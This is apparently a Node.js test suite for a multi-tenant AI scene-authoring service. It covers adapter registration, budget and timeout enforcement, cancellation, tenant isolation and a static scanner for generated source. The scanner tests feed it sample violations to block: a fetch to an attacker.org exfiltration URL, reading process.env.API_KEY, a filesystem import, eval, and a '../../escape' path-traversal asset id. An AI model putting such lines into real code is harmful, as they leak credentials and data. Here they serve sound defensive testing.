// @ts-check
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  AuthoringAdapter,
  AuthoringAdapterRegistry,
  AuthoringBudgetEnforcer,
  AuthoringJobManager,
  DeterministicMockAuthoringAdapter,
  OpenCodeAuthoringAdapter,
  DeepSeekAuthoringAdapter,
  AgyGeminiAuthoringAdapter,
  CodexAuthoringAdapter,
  validateAuthoringRequest,
  calculateAuthoringCost,
  estimatePromptTokens,
  scanSourceFilesForSecurityViolations,
  validateAndSanitizeAuthoringOutput,
  runAuthoringAdapterSelfTest,
  getAuthoringOpenApiSpec,
  validateAuthoringOpenApiSpecification,
  extendOpenApiWithAuthoring,
  AUTHORING_DEFAULT_BUDGETS,
  AUTHORING_SYSTEM_LIMITS,
  AUTHORING_PRICING_TABLE,
  CustomRuntimeError,
  SceneBundleRegistry,
  verifyProvenanceIntegrity,
} from '../index.mjs';

describe('P7-03: Provider-Neutral Authoring Adapter Contract & Registry', () => {
  it('registers all 5 built-in adapters and verifies provider classification and metadata', () => {
    const registry = new AuthoringAdapterRegistry();
    const providers = registry.listProviders();

    assert.equal(providers.length >= 5, true);

    const ids = providers.map((p) => p.id);
    assert.ok(ids.includes('mock-deterministic'));
    assert.ok(ids.includes('opencode'));
    assert.ok(ids.includes('deepseek'));
    assert.ok(ids.includes('agy-gemini'));
    assert.ok(ids.includes('codex'));

    const mock = registry.getAdapter('mock-deterministic');
    assert.ok(mock);
    assert.equal(mock.providerType, 'mock');
    assert.equal(mock.isSubscriptionRequired, false);

    const opencode = registry.getAdapter('opencode');
    assert.ok(opencode);
    assert.equal(opencode.providerType, 'local');
    assert.equal(opencode.isSubscriptionRequired, false);

    const deepseek = registry.getAdapter('deepseek');
    assert.ok(deepseek);
    assert.equal(deepseek.providerType, 'remote');
    assert.equal(deepseek.isSubscriptionRequired, false); // pay-per-token utility route

    const gemini = registry.getAdapter('agy-gemini');
    assert.ok(gemini);
    assert.equal(gemini.providerType, 'remote');
    assert.equal(gemini.isSubscriptionRequired, false); // pay-as-you-go / free tier

    const codex = registry.getAdapter('codex');
    assert.ok(codex);
    assert.equal(codex.providerType, 'remote');
    assert.equal(codex.isSubscriptionRequired, true); // commercial subscription optional
  });

  it('guarantees at least one non-premium route without mandatory subscription', () => {
    const mock = new DeterministicMockAuthoringAdapter();
    assert.equal(mock.isSubscriptionRequired, false);
    assert.equal(mock.listModels().every((m) => !m.requiresSubscription), true);

    const opencode = new OpenCodeAuthoringAdapter();
    assert.equal(opencode.isSubscriptionRequired, false);
    assert.equal(opencode.listModels().every((m) => !m.requiresSubscription), true);
  });

  it('allows registering custom authoring adapters conforming to the contract', () => {
    const registry = new AuthoringAdapterRegistry();

    class CustomTestingAdapter extends AuthoringAdapter {
      constructor() {
        super({
          id: 'custom-community-adapter',
          name: 'Custom Community Adapter',
          providerType: 'local',
          isSubscriptionRequired: false,
        });
      }
    }

    registry.registerAdapter(new CustomTestingAdapter());
    const registered = registry.getAdapter('custom-community-adapter');
    assert.ok(registered);
    assert.equal(registered.id, 'custom-community-adapter');
  });

  it('validates incoming authoring request schemas, Unicode NFC, and default budgets', () => {
    const validated = validateAuthoringRequest({
      brief: 'Thử nghiệm tiêu đề động với chữ có dấu: Tiếng Việt chuẩn NFC',
      approved_asset_ids: ['asset-logo-1', 'asset-bg-1'],
    });

    assert.equal(validated.locale, 'vi-VN');
    assert.equal(validated.budgets.max_tokens, AUTHORING_DEFAULT_BUDGETS.maxTotalTokens);
    assert.equal(validated.budgets.max_cost_usd, AUTHORING_DEFAULT_BUDGETS.maxCostUsd);
    assert.equal(validated.budgets.timeout_ms, AUTHORING_DEFAULT_BUDGETS.timeoutMs);
    assert.equal(validated.approved_asset_ids?.length, 2);
    assert.ok(validated.brief_hash.length === 64);

    // Reject empty brief
    assert.throws(
      () => validateAuthoringRequest({ brief: '   ' }),
      (err) => err instanceof CustomRuntimeError && err.code === 'INVALID_BRIEF',
    );

    // Reject unapproved / invalid asset characters
    assert.throws(
      () => validateAuthoringRequest({ brief: 'Valid brief', approved_asset_ids: ['../../escape'] }),
      (err) => err instanceof CustomRuntimeError && err.code === 'UNAPPROVED_ASSET_REFERENCE',
    );
  });
});

describe('P7-03: Deterministic Mock Adapter & Repeatable Generation', () => {
  it('generates complete custom-html-v1 files (index.html, scene.mjs, styles.css, manifest.json)', async () => {
    const adapter = new DeterministicMockAuthoringAdapter();
    const req = validateAuthoringRequest({
      brief: 'Kinetic title sequence for product launch',
      target: { width: 1280, height: 720, fps: 60, duration_seconds: 4 },
    });

    const res = await adapter.generateSceneSource(req, {
      tenantId: 'tenant-test',
      jobId: 'job-1',
    });

    assert.equal(res.status, 'succeeded');
    assert.equal(res.entrypoint, 'index.html');
    assert.ok(res.files.length >= 4);

    const paths = res.files.map((f) => f.path);
    assert.ok(paths.includes('index.html'));
    assert.ok(paths.includes('scene.mjs'));
    assert.ok(paths.includes('styles.css'));
    assert.ok(paths.includes('manifest.json'));

    const manifestStr = res.files.find((f) => f.path === 'manifest.json')?.content.toString();
    const manifest = JSON.parse(manifestStr || '{}');
    assert.equal(manifest.dimensions.width, 1280);
    assert.equal(manifest.dimensions.height, 720);
    assert.equal(manifest.fps, 60);
    assert.equal(manifest.duration_seconds, 4);
  });

  it('guarantees byte-identical repeatability for identical brief and seed', async () => {
    const adapter = new DeterministicMockAuthoringAdapter();
    const req1 = validateAuthoringRequest({
      brief: 'Repeatable generative visualizer with floating circles',
      seed: 'seed-repeat-1234',
    });
    const req2 = validateAuthoringRequest({
      brief: 'Repeatable generative visualizer with floating circles',
      seed: 'seed-repeat-1234',
    });

    const res1 = await adapter.generateSceneSource(req1, { tenantId: 'tenant-1', jobId: 'j1' });
    const res2 = await adapter.generateSceneSource(req2, { tenantId: 'tenant-1', jobId: 'j2' });

    for (const f1 of res1.files) {
      const f2 = res2.files.find((f) => f.path === f1.path);
      assert.ok(f2);
      assert.equal(f1.content.toString(), f2.content.toString());
    }
  });

  it('preserves Vietnamese NFC typography and tone marks (ă â đ ê ô ơ ư)', async () => {
    const adapter = new DeterministicMockAuthoringAdapter();
    const viText = 'Chào Mừng Đến Với Creativanta Video Engine - Đột Phá Đồ Họa';
    const req = validateAuthoringRequest({
      brief: viText,
    });

    const res = await adapter.generateSceneSource(req, { tenantId: 'tenant-vi', jobId: 'j-vi' });
    const sceneMjs = res.files.find((f) => f.path === 'scene.mjs')?.content.toString();
    assert.ok(sceneMjs);
    assert.ok(sceneMjs.includes('Chào Mừng'));
  });

  it('safely binds approved_asset_ids into scene markup without outbound external URLs', async () => {
    const adapter = new DeterministicMockAuthoringAdapter();
    const req = validateAuthoringRequest({
      brief: 'Sponsor title screen with logo element',
      approved_asset_ids: ['logo-corporate-white'],
    });

    const res = await adapter.generateSceneSource(req, { tenantId: 'tenant-asset', jobId: 'j-asset' });
    const indexHtml = res.files.find((f) => f.path === 'index.html')?.content.toString();
    assert.ok(indexHtml);
    assert.ok(indexHtml.includes('logo-corporate-white'));
    assert.equal(indexHtml.includes('http://'), false);
    assert.equal(indexHtml.includes('https://'), false);
  });
});

describe('P7-03: Token, Time, and Cost Budget Enforcer', () => {
  it('correctly estimates prompt tokens and calculates costs per pricing table', () => {
    const englishTokens = estimatePromptTokens('Simple short creative brief for testing');
    assert.ok(englishTokens > 5);

    const viTokens = estimatePromptTokens('Tiêu đề video với nhiều dấu thanh phức tạp tiếng Việt');
    assert.ok(viTokens > 10);

    const costZero = calculateAuthoringCost('mock-creative-coder-v1', 1000, 2000);
    assert.equal(costZero, 0.0);

    const costDeepseek = calculateAuthoringCost('deepseek-coder', 1000, 1000);
    assert.equal(costDeepseek > 0, true);
  });

  it('rejects preflight requests exceeding token or cost caps', () => {
    assert.throws(
      () => {
        AuthoringBudgetEnforcer.checkPreflightBudget(
          { max_tokens: 100, max_completion_tokens: 50, timeout_ms: 60000, max_cost_usd: 0.5 },
          { estimatedPromptTokens: 80, estimatedCompletionTokens: 50, estimatedCostUsd: 0.1 },
        );
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'TOKEN_BUDGET_EXCEEDED',
    );

    assert.throws(
      () => {
        AuthoringBudgetEnforcer.checkPreflightBudget(
          { max_tokens: 1000, max_completion_tokens: 500, timeout_ms: 60000, max_cost_usd: 0.01 },
          { estimatedPromptTokens: 100, estimatedCompletionTokens: 100, estimatedCostUsd: 0.05 },
        );
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'COST_BUDGET_EXCEEDED',
    );
  });

  it('enforces postflight token, completion, cost, and time budgets', () => {
    const budgets = { max_tokens: 1000, max_completion_tokens: 500, timeout_ms: 5000, max_cost_usd: 0.1 };

    // Completion token overage
    assert.throws(
      () => {
        AuthoringBudgetEnforcer.checkPostflightBudget(budgets, {
          prompt_tokens: 200,
          completion_tokens: 600,
          total_tokens: 800,
          duration_ms: 1000,
          cost_usd: 0.05,
        });
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'TOKEN_BUDGET_EXCEEDED',
    );

    // Cost budget overage
    assert.throws(
      () => {
        AuthoringBudgetEnforcer.checkPostflightBudget(budgets, {
          prompt_tokens: 200,
          completion_tokens: 200,
          total_tokens: 400,
          duration_ms: 1000,
          cost_usd: 0.25,
        });
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'COST_BUDGET_EXCEEDED',
    );

    // Timeout duration overage
    assert.throws(
      () => {
        AuthoringBudgetEnforcer.checkPostflightBudget(budgets, {
          prompt_tokens: 200,
          completion_tokens: 200,
          total_tokens: 400,
          duration_ms: 6000,
          cost_usd: 0.01,
        });
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'TIME_BUDGET_EXCEEDED',
    );
  });
});

describe('P7-03: Responsive Cancellation & AbortSignal Integration', () => {
  it('halts adapter execution immediately when AbortSignal is pre-aborted', async () => {
    const adapter = new DeterministicMockAuthoringAdapter();
    const req = validateAuthoringRequest({ brief: 'Pre-aborted test' });
    const controller = new AbortController();
    controller.abort(new Error('Caller aborted'));

    await assert.rejects(
      async () => {
        await adapter.generateSceneSource(req, {
          signal: controller.signal,
          tenantId: 't1',
          jobId: 'j-abort',
        });
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'AUTHORING_CANCELED',
    );
  });

  it('cancels active job cleanly via AuthoringJobManager.cancelJob', async () => {
    const manager = new AuthoringJobManager();
    const job = manager.createJob('tenant-alpha', {
      brief: 'Long running cancellation test',
      options: { simulatedDelayMs: 800 },
    });

    const startPromise = manager.startJob(job.id, 'tenant-alpha');
    await new Promise((r) => setTimeout(r, 50));

    manager.cancelJob(job.id, 'tenant-alpha', 'User requested cancellation');

    await assert.rejects(
      async () => {
        await startPromise;
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'AUTHORING_CANCELED',
    );

    const current = manager.getJob(job.id, 'tenant-alpha');
    assert.equal(current.state, 'canceled');
    assert.equal(current.cancellation_reason, 'User requested cancellation');
  });

  it('aborts job on timeout budget expiration', async () => {
    const manager = new AuthoringJobManager();
    const job = manager.createJob('tenant-alpha', {
      brief: 'Timeout test scene',
      budgets: { timeout_ms: 1000 },
      options: { simulatedDelayMs: 1500 },
    });

    await assert.rejects(
      async () => {
        await manager.startJob(job.id, 'tenant-alpha');
      },
      (err) =>
        err instanceof CustomRuntimeError &&
        (err.code === 'TIME_BUDGET_EXCEEDED' || err.code === 'AUTHORING_CANCELED'),
    );

    const current = manager.getJob(job.id, 'tenant-alpha');
    assert.equal(current.state, 'canceled');
    assert.ok(current.cancellation_reason?.includes('Timeout budget'));
  });
});

describe('P7-03: Source-Only Output Security & Static Scanner', () => {
  it('blocks dynamic code evaluation (eval, Function, string setTimeout)', () => {
    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations([
          { path: 'index.html', content: '<html></html>' },
          { path: 'scene.mjs', content: 'const res = eval("2 + 2");' },
        ]);
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );

    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations([
          { path: 'scene.mjs', content: 'const fn = new Function("return 1;");' },
        ]);
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );
  });

  it('blocks host process access and filesystem imports', () => {
    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations([
          { path: 'scene.mjs', content: 'const token = process.env.API_KEY;' },
        ]);
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );

    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations([
          { path: 'scene.mjs', content: 'import fs from "node:fs";' },
        ]);
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );
  });

  it('blocks network egress (fetch, XMLHttpRequest, WebSocket, outbound URLs)', () => {
    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations([
          { path: 'scene.mjs', content: 'fetch("https://attacker.org/exfiltrate");' },
        ]);
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );
  });

  it('detects and blocks secret canary tokens in generated source code', () => {
    const canary = 'CVE_SECRET_CANARY_TEST_SUITE_TOKEN_112233';
    assert.throws(
      () => {
        scanSourceFilesForSecurityViolations(
          [{ path: 'scene.mjs', content: `const leaked = "${canary}";` }],
          [canary],
        );
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'SANDBOX_SECURITY_VIOLATION',
    );
  });

  it('computes deterministic digests, CSP script hash, and AI provenance on sanitized output', () => {
    const sanitized = validateAndSanitizeAuthoringOutput(
      {
        files: [
          { path: 'index.html', content: '<!DOCTYPE html><html><body><script type="module" src="scene.mjs"></script></body></html>' },
          { path: 'scene.mjs', content: 'export function render() {}' },
        ],
        entrypoint: 'index.html',
      },
      {
        tenantId: 'tenant-sanitize',
        jobId: 'job-sanitize',
        brief: 'Test brief',
        briefHash: '0000111122223333444455556666777788889999aaaabbbbccccddddeeeeffff',
        provider: 'mock-deterministic',
        model: 'mock-creative-coder-v1',
      },
    );

    assert.ok(sanitized.source_sha256.length === 64);
    assert.ok(sanitized.build_sha256.length === 64);
    assert.ok(sanitized.csp_script_hash.includes('sha256-'));
    assert.equal(sanitized.provenance.authoring_type, 'ai');
    assert.ok(verifyProvenanceIntegrity(sanitized.provenance));
  });
});

describe('P7-03: Multi-Tenant Job Orchestration & IDOR Defenses', () => {
  it('prevents cross-tenant job access with strict 404 (Path 404 / JOB_NOT_FOUND)', () => {
    const manager = new AuthoringJobManager();
    const job = manager.createJob('tenant-alpha', { brief: 'Tenant alpha confidential design brief' });

    assert.equal(manager.getJob(job.id, 'tenant-alpha').id, job.id);

    assert.throws(
      () => {
        manager.getJob(job.id, 'tenant-beta');
      },
      (err) => err instanceof CustomRuntimeError && err.code === 'JOB_NOT_FOUND' && err.details?.statusCode === 404,
    );
  });

  it('lists jobs scoped strictly to the requesting tenant with pagination', () => {
    const manager = new AuthoringJobManager();
    manager.createJob('tenant-alpha', { brief: 'Alpha 1' });
    manager.createJob('tenant-alpha', { brief: 'Alpha 2' });
    manager.createJob('tenant-beta', { brief: 'Beta 1' });

    const alphaJobs = manager.listJobs('tenant-alpha');
    assert.equal(alphaJobs.total, 2);
    assert.equal(alphaJobs.jobs.every((j) => j.tenant_id === 'tenant-alpha'), true);

    const betaJobs = manager.listJobs('tenant-beta');
    assert.equal(betaJobs.total, 1);
  });
});

describe('P7-03: SceneBundleRegistry Integration with AI Provenance', () => {
  it('imports completed authoring job output as a new Scene Bundle with verified AI provenance', async () => {
    const manager = new AuthoringJobManager();
    const sceneRegistry = new SceneBundleRegistry({
      config: {
        CVE_CUSTOM_CODE_ENABLED: false,
        CVE_CUSTOM_RUNTIME: 'disabled',
        CVE_CUSTOM_TENANT_ALLOWLIST: [],
      },
    });

    const job = manager.createJob('tenant-integration', {
      brief: 'Kinetic typography title for seasonal sale',
    });
    await manager.startJob(job.id, 'tenant-integration');

    const result = await manager.importJobOutputToRegistry(job.id, 'tenant-integration', sceneRegistry, {
      name: 'Seasonal Sale Kinetic Title',
    });

    assert.equal(result.action, 'bundle_created');
    assert.ok(result.bundle);
    assert.equal(result.bundle.tenant_id, 'tenant-integration');

    const revision = sceneRegistry.getRevision('tenant-integration', result.bundle.id, 1);
    assert.ok(revision);
    assert.equal(revision.status, 'draft');
    assert.equal(revision.provenance.authoring_type, 'ai');
    assert.equal(revision.provenance.ai_metadata?.provider, 'mock-deterministic');
    assert.ok(verifyProvenanceIntegrity(revision.provenance));
  });

  it('imports completed authoring job output as a new revision in an existing bundle', async () => {
    const manager = new AuthoringJobManager();
    const sceneRegistry = new SceneBundleRegistry();

    // Create base bundle and publish v1
    const initial = sceneRegistry.createBundle('tenant-alpha', {
      id: 'bundle-test-evolve',
      name: 'Evolving Scene Bundle',
      entrypoint: 'index.html',
      source_files: [{ path: 'index.html', content: '<h1>V1</h1>' }],
    });
    sceneRegistry.publishRevision('tenant-alpha', initial.bundle.id, 1, { skipScan: true });

    const job = manager.createJob('tenant-alpha', {
      brief: 'Updated kinetic typography revision',
    });
    await manager.startJob(job.id, 'tenant-alpha');

    const result = await manager.importJobOutputToRegistry(job.id, 'tenant-alpha', sceneRegistry, {
      bundleId: initial.bundle.id,
    });

    assert.equal(result.action, 'revision_created');
    assert.ok(result.revision);
    assert.equal(result.revision.revision, 2);
    assert.equal(result.revision.base_revision, 1);
    assert.equal(result.revision.provenance.authoring_type, 'ai');
  });
});

describe('P7-03: Authoring OpenAPI 3.1 Extension Specification', () => {
  it('validates OpenAPI 3.1 structure and verifies all required routes', () => {
    const spec = getAuthoringOpenApiSpec();
    const validation = validateAuthoringOpenApiSpecification(spec);

    assert.equal(validation.valid, true);
    assert.equal(validation.errors.length, 0);

    const paths = Object.keys(spec.paths || {});
    assert.ok(paths.includes('/authoring-jobs'));
    assert.ok(paths.includes('/authoring-jobs/{id}'));
    assert.ok(paths.includes('/authoring-jobs/{id}/cancel'));
    assert.ok(paths.includes('/authoring-providers'));
  });

  it('merges Authoring OpenAPI specification into base specification', () => {
    const baseSpec = {
      openapi: '3.1.0',
      info: { title: 'Base API', version: '1.0.0' },
      paths: { '/health': { get: { summary: 'Health' } } },
      components: { schemas: {} },
    };

    const merged = extendOpenApiWithAuthoring(baseSpec);
    assert.ok(merged.paths['/health']);
    assert.ok(merged.paths['/authoring-jobs']);
    assert.ok(merged.paths['/authoring-providers']);
    assert.ok(merged.components.schemas['AuthoringJobRequest']);
  });
});

describe('P7-03: Automated Self-Test Verification', () => {
  it('passes all 14 checks in runAuthoringAdapterSelfTest with status PASS', async () => {
    const report = await runAuthoringAdapterSelfTest();
    assert.equal(report.status, 'PASS');
    assert.equal(report.totalChecks, 14);
    assert.equal(report.passedChecks, 14);
    assert.equal(report.failedChecks, 0);
  });
});
